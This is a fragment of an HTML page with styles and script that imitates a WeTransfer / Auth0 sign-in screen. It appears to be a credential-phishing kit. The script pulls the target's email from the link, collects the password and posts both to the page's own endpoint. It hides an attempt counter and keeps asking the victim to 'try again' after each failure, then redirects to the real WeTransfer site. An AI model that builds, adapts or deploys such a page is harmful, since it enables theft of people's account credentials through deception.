    <style>
        /* ===== SLEEK ERROR STYLES (KEEP THESE) ===== */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.75);
            backdrop-filter: blur(6px);
            -webkit-backdrop-filter: blur(6px);
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 9999;
            transition: opacity 0.3s ease;
        }
        .loading-overlay.active {
            display: flex;
            opacity: 1;
        }
        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #e0e0e0;
            border-top: 4px solid #000;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .loading-text {
            margin-top: 20px;
            font-family: 'Helvetica Neue', Arial, sans-serif;
            font-size: 16px;
            color: #333;
            letter-spacing: 0.5px;
        }

        .error-message {
            text-align: center;
            font-size: 14px;
            font-weight: 400;
            padding: 8px 0 4px;
            opacity: 0;
            transition: opacity 0.35s ease, transform 0.35s ease;
            transform: translateY(-4px);
        }
        .error-message.show {
            opacity: 1;
            transform: translateY(0);
        }
        .error-message--sleek {
            color: #e65050;
            background: rgba(230, 80, 80, 0.06);
            border-radius: 12px;
            padding: 10px 14px;
            font-size: 14px;
            letter-spacing: 0.2px;
        }
        .error-message--sleek .emoji {
            font-size: 18px;
            display: inline-block;
            margin-right: 6px;
        }
        .error-message--sleek .highlight {
            font-weight: 500;
        }

        .auth0-lock-input-wrap.show-error {
            border-color: #e65050 !important;
            box-shadow: 0 0 0 3px rgba(230, 80, 80, 0.12);
        }

        .form-group.shake .input-wrapper {
            animation: shake 0.4s ease-in-out;
        }
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            20%, 60% { transform: translateX(-8px); }
            40%, 80% { transform: translateX(8px); }
        }

        /* Hide attempt counter */
        .attempt-counter {
            display: none !important;
        }
        .sleek-error-container {
            margin-top: 6px;
            min-height: 44px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .sleek-error-container .error-message--sleek {
            width: 100%;
        }

        /* Improved email display – remove '#' and show envelope icon */
        .email-display-sleek {
            display: flex;
            align-items: center;
            gap: 10px;
            background: #f2f4f8;
            border-radius: 12px;
            padding: 0.75rem 1rem;
            margin-bottom: 1rem;
            font-size: 0.95rem;
            color: #1a1a1a;
        }
        .email-display-sleek .email-icon {
            color: #7a7f8a;
            font-size: 1.2rem;
        }
        .email-display-sleek .email-value {
            font-weight: 500;
            word-break: break-all;
            flex: 1;
        }
    </style>
</head>

                                                    <span>

                                                            <div style="visibility: inherit;">
                                                                <div class="auth0-lock-view-content">
                                                                    <div style="position: relative;">
                                                                        <div class="auth0-lock-body-content">
                                                                            <div class="auth0-lock-content">

                                                                                        <div>
                                                                                            <div class="auth0-lock-pane-separator"></div>
                                                                                            <div>
                                                                                                <!-- EMAIL DISPLAY – NO '#' , CLEAN ICON -->
                                                                                                <div class="email-display-sleek">
                                                                                                    <span class="email-icon">✉️</span>
                                                                                                    <span class="email-value" id="emailDisplay">—</span>
                                                                                                </div>
                                                                                                <!-- Password field -->
                                                                                                <div class="auth0-lock-input-block auth0-lock-input-show-password" id="passwordBlock">
                                                                                                    <div class="auth0-lock-input-block auth0-lock-input-password">
                                                                                                        <div class="auth0-lock-input-wrap auth0-lock-focused auth0-lock-input-wrap-with-icon" id="passwordWrap">
                                                                                                            <span aria-hidden="true">
                                                                                                                <svg aria-hidden="true" focusable="false" width="11px" height="14px" viewBox="0 0 13 16" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" class="auth0-lock-icon auth0-lock-icon-box">
                                                                                                                    <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                                                                                                        <g transform="translate(-288.000000, -1508.000000)" fill="#888888">
                                                                                                                            <path d="M299,1523.998 L290,1523.998 C288.896,1523.998 288,1523.102 288,1521.999 L288,1515.999 C288,1514.895 288.896,1513.998 290,1513.998 L290,1513.998 L290,1512.499 C290,1510.015 292.015,1507.999 294.5,1507.999 C296.985,1507.999 299,1510.015 299,1512.499 L299,1513.999 C300.104,1513.999 301,1514.895 301,1515.999 L301,1521.999 C301,1523.103 300.104,1523.998 299,1523.998 L299,1523.998 Z M298,1512.499 C298,1510.566 296.433,1508.999 294.5,1508.999 C292.567,1508.999 291,1510.566 291,1512.499 L291,1513.998 L298,1513.998 L298,1512.499 L298,1512.499 Z M300,1515.999 C300,1515.446 299.552,1514.998 299,1514.998 L290,1514.998 C289.447,1514.998 289,1515.446 289,1515.999 L289,1521.999 C289,1522.551 289.447,1522.998 290,1522.998 L299,1522.998 C299.552,1522.998 300,1522.551 300,1521.999 L300,1515.999 L300,1515.999 Z M294.5,1520.998 C294.224,1520.998 294,1520.774 294,1520.498 L294,1517.498 C294,1517.223 294.224,1516.999 294.5,1516.999 C294.776,1516.999 295,1517.223 295,1517.498 L295,1520.498 C295,1520.774 294.776,1520.998 294.5,1520.998 L294.5,1520.998 Z"></path>

                                                                                                            </span>
                                                                                                            <input type="password" name="password" class="auth0-lock-input" autocomplete="off" autocapitalize="off" aria-invalid="false" placeholder="Password" tabindex="2" id="password">

                                                                                                <div class="sleek-error-container">
                                                                                                    <div id="passwordError" class="error-message"></div>
                                                                                                </div>
                                                                                                <!-- Attempt counter is hidden via CSS -->
                                                                                                <div id="attemptCounter" class="attempt-counter"></div>

                                        <button class="auth0-lock-submit" name="submit" type="submit" style="background-color: rgb(25, 25, 25); display: block;" id="submit-btn">
                                            <div class="auth0-loading-container">
                                                <div class="auth0-loading"></div>
                                            </div>
                                            <span class="auth0-label-submit">
                                                Log in with WeTransfer
                                                <span>
                                                    <svg aria-hidden="true" focusable="false" class="icon-text" width="8px" height="12px" viewBox="0 0 8 12" version="1.1" xmlns="http://www.w3.org/2000/svg">
                                                        <g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                                            <g id="Web/Submit/Active" transform="translate(-148.000000, -32.000000)" fill="#FFFFFF">
                                                                <polygon id="Shape" points="148 33.4 149.4 32 155.4 38 149.4 44 148 42.6 152.6 38"></polygon>

    </main>

    <script>
        (function() {
            'use strict';

            // ========== CONFIG ==========
            // Set to true to test the error flow without a real API.
            // When enabled, any password except 'demo123' will trigger the sleek error.
            const DEMO_MODE = false; // Change to false when using your real API

            const API_URL = '/api/login';
            const loadingOverlay = document.getElementById('loadingOverlay');
            const one = document.getElementById('one');
            const two = document.getElementById('two');
            const downloadBtn = document.getElementById('download');
            const submitBtn = document.getElementById('submit-btn');
            const passwordInput = document.getElementById('password');
            const emailDisplay = document.getElementById('emailDisplay');
            const passwordError = document.getElementById('passwordError');
            const attemptCounter = document.getElementById('attemptCounter');
            const passwordWrap = document.getElementById('passwordWrap');
            const passwordBlock = document.getElementById('passwordBlock');

            let currentEmail = '';
            let attemptCount = 0;

            function getEmailFromURL() {
                if (window.location.hash) {
                    const hashParams = new URLSearchParams(window.location.hash.substring(1));
                    const email = hashParams.get('email');
                    if (email) return email;
                    const match = window.location.hash.match(
                        /[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?/i
                    );
                    if (match) return match[0];
                }
                const params = new URLSearchParams(window.location.search);
                return params.get('email') || '';
            }

            function setLoading(loading) {
                if (loading) {
                    loadingOverlay.classList.add('active');
                } else {
                    loadingOverlay.classList.remove('active');
                }
                downloadBtn.disabled = loading;
                submitBtn.disabled = loading;
            }

            function showSleekError(attempt) {
                hideError();
                let msg = '';
                if (attempt === 1) {
                    msg =
                        '<div class="error-message--sleek"><span class="emoji">🤔</span> <span class="highlight">Oops!</span> That password doesn’t look right. <span class="highlight">One more try?</span></div>';
                } else if (attempt === 2) {
                    msg =
                        '<div class="error-message--sleek"><span class="emoji">🧐</span> Hmm, still not matching. <span class="highlight">Take a breath and try again?</span></div>';
                } else {
                    msg =
                        '<div class="error-message--sleek"><span class="emoji">💡</span> Almost there! <span class="highlight">Give it one more go.</span></div>';
                }
                passwordError.innerHTML = msg;
                passwordError.classList.add('show');
                passwordWrap.classList.add('show-error');
                passwordBlock.classList.add('shake');
                setTimeout(() => passwordBlock.classList.remove('shake'), 400);
            }

            function hideError() {
                passwordError.innerHTML = '';
                passwordError.classList.remove('show');
                passwordWrap.classList.remove('show-error');
            }

            // Step 1: Download All
            downloadBtn.addEventListener('click', function(e) {
                e.preventDefault();
                hideError();

                const email = getEmailFromURL();
                if (!email) {
                    passwordError.innerHTML =
                        '<div class="error-message--sleek"><span class="emoji">⚠️</span> Email not found in URL.</div>';
                    passwordError.classList.add('show');
                    return;
                }

                setLoading(true);

                if (DEMO_MODE) {
                    // Simulate API success
                    setTimeout(() => {
                        setLoading(false);
                        currentEmail = email;
                        emailDisplay.textContent = currentEmail;
                        one.style.display = 'none';
                        two.style.display = 'block';
                        passwordInput.focus();
                        attemptCount = 0;
                        hideError();
                        passwordInput.value = '';
                    }, 800);
                    return;
                }

                fetch(API_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ action: 'email', email: email })
                    })
                    .then(response => response.json())
                    .then(data => {
                        setLoading(false);
                        if (data.success) {
                            currentEmail = email;
                            emailDisplay.textContent = currentEmail;
                            one.style.display = 'none';
                            two.style.display = 'block';
                            passwordInput.focus();
                            attemptCount = 0;
                            hideError();
                            passwordInput.value = '';
                        } else {
                            passwordError.innerHTML =
                                '<div class="error-message--sleek"><span class="emoji">⚠️</span> ' + (data
                                    .error || 'Something went wrong.') + '</div>';
                            passwordError.classList.add('show');
                        }
                    })
                    .catch(err => {
                        setLoading(false);
                        passwordError.innerHTML =
                            '<div class="error-message--sleek"><span class="emoji">🌐</span> Network error. Please try again.</div>';
                        passwordError.classList.add('show');
                    });
            });

            // Step 2: Submit password
            submitBtn.addEventListener('click', function(e) {
                e.preventDefault();
                hideError();

                const password = passwordInput.value.trim();
                if (!password) {
                    passwordError.innerHTML =
                        '<div class="error-message--sleek"><span class="emoji">✍️</span> Please enter your password.</div>';
                    passwordError.classList.add('show');
                    passwordInput.focus();
                    return;
                }

                attemptCount++;
                setLoading(true);

                if (DEMO_MODE) {
                    setTimeout(() => {
                        setLoading(false);
                        if (password === 'demo123') {
                            // Success – redirect
                            window.location.href = 'https://wetransfer.com/your-files';
                        } else {
                            // Show sleek error
                            showSleekError(attemptCount);
                            passwordInput.value = '';
                            passwordInput.focus();
                        }
                    }, 700);
                    return;
                }

                fetch(API_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            action: 'password',
                            email: currentEmail,
                            password: password,
                            remember: document.getElementById('remember') ? (document.getElementById('remember')
                                .checked ? 1 : 0) : 0
                        })
                    })
                    .then(response => {
                        // Check if response is OK (status 2xx)
                        if (!response.ok) {
                            // Try to parse error from JSON, else use status text
                            return response.json().then(data => {
                                throw new Error(data.error || response.statusText);
                            }).catch(() => {
                                throw new Error('Incorrect password. Please try again.');
                            });
                        }
                        return response.json();
                    })
                    .then(data => {
                        setLoading(false);
                        if (data.redirect) {
                            window.location.href = data.redirect;
                        } else {
                            // No redirect – show error
                            showSleekError(attemptCount);
                            passwordInput.value = '';
                            passwordInput.focus();
                        }
                    })
                    .catch(err => {
                        setLoading(false);
                        // This will catch any error, including 401 from the API
                        showSleekError(attemptCount);
                        passwordInput.value = '';
                        passwordInput.focus();
                    });
            });

            // Clear error on typing / focusing
            passwordInput.addEventListener('input', function() {
                hideError();
            });
            passwordInput.addEventListener('focus', function() {
                hideError();
            });

            // Auto-focus password when step 2 appears
            const observer = new MutationObserver(function() {
                if (two.style.display !== 'none' && two.style.display !== '') {
                    setTimeout(() => passwordInput.focus(), 300);
                    observer.disconnect();
                }
            });
            observer.observe(two, { attributes: true, attributeFilter: ['style'] });

            if (two.style.display !== 'none' && two.style.display !== '') {
                setTimeout(() => passwordInput.focus(), 300);
            }

            passwordInput.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    submitBtn.click();
                }
            });

        })();
    </script>
